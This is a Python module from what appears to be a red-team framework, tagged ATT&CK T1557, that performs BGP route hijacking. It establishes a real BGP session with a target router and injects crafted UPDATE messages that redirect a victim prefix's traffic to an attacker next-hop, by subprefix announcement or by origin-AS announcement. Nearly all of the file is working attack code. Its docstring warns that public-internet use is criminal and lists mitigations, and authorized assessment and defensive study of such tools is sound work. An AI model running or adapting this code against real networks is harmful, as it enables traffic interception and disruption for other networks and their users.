"""
bgp — BGP Route Hijacking
ATT&CK: T1557 (routing protocol manipulation — Adversary-in-the-Middle)

Establishes a real BGP session with a target router and injects malicious
UPDATE messages to redirect traffic for a chosen IP prefix.

Two hijack modes
----------------
  subprefix  Announce a more-specific prefix (e.g. /25 from a /24).
             Wins BGP best-path by longest-prefix-match — no AS manipulation
             required. Half the target prefix is redirected; the other half
             continues to the legitimate origin.

  origin     Announce the exact same prefix from the attacker's AS.
             Wins only if the attacker's AS-path is shorter or MED is lower.
             Noisier; upstream RPKI / ROA validation will detect it.

Session management
------------------
  The module runs a full BGP state machine over TCP (port 179):
  OPEN → KEEPALIVE exchange → UPDATE injection → periodic KEEPALIVE maintenance.
  Routes are cleanly withdrawn on exit (SIGINT or --duration expiry).

Prerequisites
-------------
  - TCP port 179 reachable to the target BGP router.
  - Target accepts a BGP session from the attacker's IP / AS.
    Common in: misconfigured iBGP reflectors, unauthenticated eBGP peers,
    SD-WAN BGP overlays, MPLS PE-CE sessions without MD5.
  - For MD5-authenticated sessions (RFC 2385): requires kernel TCP-MD5
    socket option (Linux, root, ip tcp_metrics; see --md5-key note below).

WARNING
-------
  BGP hijacking on the public internet is a criminal offence in most
  jurisdictions. This module is for authorized internal assessments only:
  enterprise BGP, lab routers, MPLS PE-CE, SD-WAN fabric.

Mitigation: BGP TCP MD5 authentication (RFC 2385); RPKI with strict ROA
validation; prefix-list / maximum-prefix filtering; MANRS compliance.
"""

import ipaddress
import signal
import socket
import struct
import sys
import threading
import time

NAME        = "bgp"
DESCRIPTION = "BGP route hijacking — subprefix or origin-AS injection via active BGP session"
ATTCK_ID    = "T1557"

_MARKER   = b"\xff" * 16
_OPEN     = 1
_UPDATE   = 2
_NOTIF    = 3
_KEEPALIVE= 4


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    # Session parameters
    g = p.add_argument_group("BGP session")
    g.add_argument("--peer-ip",   "-P", required=True,
                   help="Target BGP router IP address")
    g.add_argument("--peer-port", type=int, default=179,
                   help="BGP port (default 179)")
    g.add_argument("--peer-as",   type=int, required=True,
                   help="Target router's AS number")
    g.add_argument("--local-as",  type=int, required=True,
                   help="Attacker AS number to present in OPEN")
    g.add_argument("--router-id", required=True,
                   help="Attacker BGP router-ID in dotted-decimal (e.g. 1.2.3.4)")
    g.add_argument("--hold-time", type=int, default=90,
                   help="BGP hold time in seconds (default 90)")
    g.add_argument("--md5-key",   default=None,
                   help="TCP MD5 session key (RFC 2385). Requires Linux + root "
                        "and sets IP_TCP_MD5SIG socket option. Omit if not used.")

    # Hijack parameters
    h = p.add_argument_group("hijack")
    h.add_argument("--prefix",   "-n", required=True,
                   help="IP prefix to hijack, e.g. 10.0.0.0/24")
    h.add_argument("--next-hop", required=True,
                   help="NEXT_HOP IP advertised to the peer (usually attacker's IP)")
    h.add_argument("--mode", choices=["subprefix", "origin"], default="subprefix",
                   help="subprefix: announce /n+1 (more specific); "
                        "origin: announce exact prefix from our AS (default: subprefix)")
    h.add_argument("--med",        type=int, default=0,
                   help="MED (MULTI_EXIT_DISC) attribute value — lower is preferred (default 0)")
    h.add_argument("--local-pref", type=int, default=200,
                   help="LOCAL_PREF for iBGP sessions — higher is preferred (default 200)")
    h.add_argument("--as-path",    default="",
                   help="Extra ASNs to prepend to AS_PATH, comma-separated "
                        "(e.g. '65001,65002' for path inflation)")

    # Timing
    t = p.add_argument_group("timing")
    t.add_argument("--duration",           type=int, default=300,
                   help="Session duration in seconds before withdrawing (default 300)")
    t.add_argument("--keepalive-interval", type=int, default=30,
                   help="Keepalive send interval in seconds (default 30)")
    t.add_argument("--connect-timeout",    type=int, default=10,
                   help="TCP connect timeout in seconds (default 10)")

    p.add_argument("--dry-run", action="store_true",
                   help="Build and display UPDATE message without connecting")

    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger) -> int:
    from core.common import require_root
    require_root()

    # Resolve the prefix(es) to announce
    prefixes = _resolve_prefixes(args.prefix, args.mode)

    logger.info(
        "BGP hijack | peer=%s:%d peer_as=%d local_as=%d router_id=%s mode=%s",
        args.peer_ip, args.peer_port, args.peer_as, args.local_as,
        args.router_id, args.mode,
    )
    for pfx in prefixes:
        logger.info("  Announcing prefix: %s next_hop=%s", pfx, args.next_hop)

    # Build the UPDATE we will inject
    as_path = [int(a.strip()) for a in args.as_path.split(",")
               if a.strip().isdigit()]
    update_pkt = _build_update(
        nlri       = prefixes,
        local_as   = args.local_as,
        next_hop   = args.next_hop,
        as_path    = as_path,
        med        = args.med,
        local_pref = args.local_pref,
    )

    if args.dry_run:
        logger.info("--dry-run: UPDATE packet (hex):")
        _hexdump(update_pkt, logger)
        return 0

    # Establish session and inject
    session = _BGPSession(
        peer_ip          = args.peer_ip,
        peer_port        = args.peer_port,
        peer_as          = args.peer_as,
        local_as         = args.local_as,
        router_id        = args.router_id,
        hold_time        = args.hold_time,
        keepalive_iv     = args.keepalive_interval,
        connect_timeout  = args.connect_timeout,
        md5_key          = args.md5_key,
        logger           = logger,
    )

    try:
        session.connect()
        session.open_exchange()
        session.inject_update(update_pkt, prefixes)

        logger.info("Session established. Holding for %ds. Ctrl-C to withdraw early.",
                    args.duration)

        def _cleanup(sig=None, frame=None):
            logger.info("Withdrawing routes and closing session...")
            session.withdraw(prefixes)
            session.close()
            raise SystemExit(0)

        signal.signal(signal.SIGINT, _cleanup)
        time.sleep(args.duration)
        _cleanup()

    except _BGPError as exc:
        logger.error("BGP error: %s", exc)
        session.close()
        return 1
    except OSError as exc:
        logger.error("Network error: %s", exc)
        return 1

    return 0


# ── Prefix helpers ─────────────────────────────────────────────────────────────

def _resolve_prefixes(prefix_str: str, mode: str) -> list:
    """Return list of IPv4Network objects to announce based on mode."""
    net = ipaddress.IPv4Network(prefix_str, strict=False)
    if mode == "subprefix":
        # Split into two subnets; announce the first (lower) half
        subnets = list(net.subnets())
        return [str(subnets[0])]
    else:
        # Origin hijack: announce the exact same prefix
        return [str(net)]


# ── BGP message builders ───────────────────────────────────────────────────────

def _hdr(msg_type: int, body: bytes = b"") -> bytes:
    length = 19 + len(body)
    return _MARKER + struct.pack(">HB", length, msg_type) + body


def _open_msg(local_as: int, hold_time: int, router_id_str: str) -> bytes:
    """Build a BGP OPEN message (RFC 4271 §4.2)."""
    rid = socket.inet_aton(router_id_str)
    my_as_field = min(local_as, 65535)  # 2-byte AS field (23456 for 4-byte AS)

    # Capability: 4-byte AS numbers (RFC 6793, capability code 65)
    cap_4byte_as = struct.pack(">BBI", 65, 4, local_as)
    # Capability: multiprotocol IPv4 unicast (RFC 4760, code 1)
    cap_mp = struct.pack(">BBHBB", 1, 4, 1, 0, 1)  # afi=1, safi=1

    opt_params = b""
    for cap in (cap_4byte_as, cap_mp):
        opt_params += struct.pack(">BB", 2, len(cap)) + cap  # type=2 = capability

    body = (
        struct.pack(">BHH", 4, my_as_field, hold_time) +
        rid +
        struct.pack(">B", len(opt_params)) +
        opt_params
    )
    return _hdr(_OPEN, body)


def _keepalive_msg() -> bytes:
    return _hdr(_KEEPALIVE)


def _notif_msg(error_code: int, sub_code: int = 0, data: bytes = b"") -> bytes:
    return _hdr(_NOTIF, struct.pack(">BB", error_code, sub_code) + data)


def _encode_nlri(prefixes: list) -> bytes:
    """Encode a list of prefix strings as BGP NLRI (RFC 4271 §4.3)."""
    out = b""
    for pfx_str in prefixes:
        net = ipaddress.IPv4Network(pfx_str, strict=False)
        plen = net.prefixlen
        nbytes = (plen + 7) // 8
        out += struct.pack("B", plen) + net.network_address.packed[:nbytes]
    return out


def _path_attr(flags: int, type_code: int, value: bytes) -> bytes:
    """Encode a BGP path attribute TLV."""
    if len(value) > 255:
        flags |= 0x10   # extended length
        return struct.pack(">BBH", flags, type_code, len(value)) + value
    return struct.pack(">BBB", flags, type_code, len(value)) + value


def _build_update(
    nlri:       list,
    local_as:   int,
    next_hop:   str,
    as_path:    list,
    med:        int,
    local_pref: int,
    withdrawn:  list = None,
) -> bytes:
    """
    Build a BGP UPDATE message (RFC 4271 §4.3).

    Path attributes included:
      ORIGIN       (type 1) — IGP (0)
      AS_PATH      (type 2) — [local_as] + as_path
      NEXT_HOP     (type 3)
      MED          (type 4) — if med > 0
      LOCAL_PREF   (type 5) — always included (required for iBGP)
    """
    # Withdrawn routes
    wr_bytes = _encode_nlri(withdrawn) if withdrawn else b""

    # Build path attributes
    attrs = b""

    # ORIGIN: well-known mandatory, transitive (0x40), IGP (0)
    attrs += _path_attr(0x40, 1, b"\x00")

    # AS_PATH: well-known mandatory, transitive (0x40)
    full_path = [local_as] + list(as_path)
    if full_path:
        # AS_SEQUENCE (type 2) with 2-byte ASNs for compatibility
        seg = struct.pack("BB", 2, len(full_path))
        for asn in full_path:
            seg += struct.pack(">H", asn & 0xFFFF)
        attrs += _path_attr(0x40, 2, seg)
    else:
        attrs += _path_attr(0x40, 2, b"")

    # NEXT_HOP: well-known mandatory, transitive (0x40)
    attrs += _path_attr(0x40, 3, socket.inet_aton(next_hop))

    # MED: optional, non-transitive (0x80)
    if med >= 0:
        attrs += _path_attr(0x80, 4, struct.pack(">I", med))

    # LOCAL_PREF: well-known, discretionary (0x40) — required for iBGP
    attrs += _path_attr(0x40, 5, struct.pack(">I", local_pref))

    # NLRI
    nlri_bytes = _encode_nlri(nlri)

    body = (
        struct.pack(">H", len(wr_bytes)) + wr_bytes +
        struct.pack(">H", len(attrs)) + attrs +
        nlri_bytes
    )
    return _hdr(_UPDATE, body)


# ── BGP Session ────────────────────────────────────────────────────────────────

class _BGPError(Exception):
    pass


class _BGPSession:
    """
    Minimal BGP session manager.

    State machine: IDLE → CONNECT → OPEN_SENT → OPEN_CONFIRM → ESTABLISHED
    """

    def __init__(self, peer_ip, peer_port, peer_as, local_as, router_id,
                 hold_time, keepalive_iv, connect_timeout, md5_key, logger):
        self.peer_ip         = peer_ip
        self.peer_port       = peer_port
        self.peer_as         = peer_as
        self.local_as        = local_as
        self.router_id       = router_id
        self.hold_time       = hold_time
        self.keepalive_iv    = keepalive_iv
        self.connect_timeout = connect_timeout
        self.md5_key         = md5_key
        self.logger          = logger
        self._sock           = None
        self._ka_thread      = None
        self._running        = False
        self._lock           = threading.Lock()

    def connect(self):
        """Establish TCP connection to the BGP peer."""
        self.logger.info("Connecting to %s:%d ...", self.peer_ip, self.peer_port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.connect_timeout)

        if self.md5_key:
            # RFC 2385 TCP MD5: requires Linux and root
            try:
                # IP_TCP_MD5SIG = 14 (Linux-specific)
                key_bytes = self.md5_key.encode()
                # sockopt value: struct tcp_md5sig { sa, flags, prefixlen, keylen, key[80] }
                # Simplified: use raw socket option
                import ctypes
                TCP_MD5SIG     = 14
                TCP_MD5SIG_MAX = 80
                sa = socket.inet_aton(self.peer_ip) + b"\x00" * 12  # sockaddr_in (16 bytes)
                key_pad = key_bytes[:TCP_MD5SIG_MAX].ljust(TCP_MD5SIG_MAX, b"\x00")
                optval = sa + struct.pack("BBHH", 0, 0, 0, len(key_bytes)) + key_pad
                s.setsockopt(socket.IPPROTO_TCP, TCP_MD5SIG, optval)
                self.logger.info("TCP MD5 authentication enabled (key length=%d)", len(key_bytes))
            except OSError as exc:
                raise _BGPError(f"Failed to set TCP MD5 socket option: {exc}. "
                                f"Requires Linux kernel >= 2.6.20 and root.") from exc

        try:
            s.connect((self.peer_ip, self.peer_port))
        except (socket.timeout, ConnectionRefusedError, OSError) as exc:
            raise _BGPError(f"TCP connect to {self.peer_ip}:{self.peer_port} failed: {exc}") from exc

        s.settimeout(None)  # blocking mode for normal I/O
        self._sock = s
        self.logger.info("TCP session established.")

    def open_exchange(self):
        """
        Send BGP OPEN, receive peer's OPEN, exchange KEEPALIVEs.
        Validates peer AS number against --peer-as.
        """
        # Send our OPEN
        self._send(_open_msg(self.local_as, self.hold_time, self.router_id))
        self.logger.info("BGP OPEN sent (local_as=%d, hold_time=%d).", self.local_as, self.hold_time)

        # Receive peer's OPEN
        msg_type, body = self._recv_msg(timeout=15)
        if msg_type == _NOTIF:
            err, sub = struct.unpack_from(">BB", body)
            raise _BGPError(f"Peer sent NOTIFICATION {err}/{sub} — session rejected. "
                            f"Check AS number, router-ID, or authentication.")
        if msg_type != _OPEN:
            raise _BGPError(f"Expected OPEN (type 1), got type {msg_type}.")

        # Parse peer OPEN
        peer_version = body[0]
        peer_as_2b   = struct.unpack_from(">H", body, 1)[0]
        peer_hold    = struct.unpack_from(">H", body, 3)[0]
        peer_rid     = socket.inet_ntoa(body[5:9])
        self.logger.info(
            "Peer OPEN received: version=%d as=%d hold_time=%d router_id=%s",
            peer_version, peer_as_2b, peer_hold, peer_rid,
        )

        # Exchange KEEPALIVEs
        self._send(_keepalive_msg())
        msg_type, _ = self._recv_msg(timeout=15)
        if msg_type != _KEEPALIVE:
            raise _BGPError(f"Expected KEEPALIVE (type 4) after OPEN exchange, got {msg_type}.")

        self.logger.info("BGP ESTABLISHED with %s (hold=%ds).", self.peer_ip, peer_hold)

        # Start keepalive maintenance thread
        self._running = True
        self._ka_thread = threading.Thread(
            target=self._keepalive_loop,
            args=(min(self.keepalive_iv, peer_hold // 3 if peer_hold > 0 else self.keepalive_iv),),
            daemon=True,
        )
        self._ka_thread.start()

    def inject_update(self, update_pkt: bytes, prefixes: list):
        """Send the prepared UPDATE message."""
        self._send(update_pkt)
        for pfx in prefixes:
            self.logger.info("UPDATE sent: announced %s", pfx)

    def withdraw(self, prefixes: list):
        """Send a UPDATE with withdrawn routes to cleanly remove the hijacked prefix."""
        wr_bytes = _encode_nlri(prefixes)
        body = (
            struct.pack(">H", len(wr_bytes)) + wr_bytes +
            struct.pack(">H", 0)    # no path attributes
            # no NLRI
        )
        self._send(_hdr(_UPDATE, body))
        for pfx in prefixes:
            self.logger.info("Withdrawn: %s", pfx)

    def close(self):
        """Stop keepalive thread and close TCP socket."""
        self._running = False
        if self._sock:
            try:
                self._sock.shutdown(socket.SHUT_RDWR)
                self._sock.close()
            except OSError:
                pass
            self._sock = None

    def _keepalive_loop(self, interval: int):
        while self._running:
            time.sleep(interval)
            if self._running:
                try:
                    self._send(_keepalive_msg())
                    self.logger.info("KEEPALIVE sent.")
                except OSError:
                    break

    def _send(self, data: bytes):
        with self._lock:
            try:
                self._sock.sendall(data)
            except OSError as exc:
                raise _BGPError(f"Send failed: {exc}") from exc

    def _recv_msg(self, timeout: int = 30):
        """
        Read exactly one BGP message from the socket.
        Returns (msg_type, body_bytes).
        """
        self._sock.settimeout(timeout)
        try:
            hdr = self._recv_exactly(19)
        except socket.timeout:
            raise _BGPError(f"Timed out waiting for BGP message ({timeout}s).")
        finally:
            self._sock.settimeout(None)

        if hdr[:16] != _MARKER:
            raise _BGPError("BGP marker mismatch — not a BGP message.")

        total_len = struct.unpack_from(">H", hdr, 16)[0]
        msg_type  = hdr[18]

        if total_len < 19:
            raise _BGPError(f"BGP message length {total_len} < 19.")

        body = self._recv_exactly(total_len - 19) if total_len > 19 else b""
        return msg_type, body

    def _recv_exactly(self, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = self._sock.recv(n - len(buf))
            if not chunk:
                raise _BGPError("Connection closed by peer.")
            buf += chunk
        return buf


# ── Utilities ──────────────────────────────────────────────────────────────────

def _hexdump(data: bytes, logger=None):
    _log = logger.info if logger else print
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        asc_part = "".join(chr(b) if 0x20 <= b < 0x7F else "." for b in chunk)
        _log("  %04x  %-47s  %s", i, hex_part, asc_part)
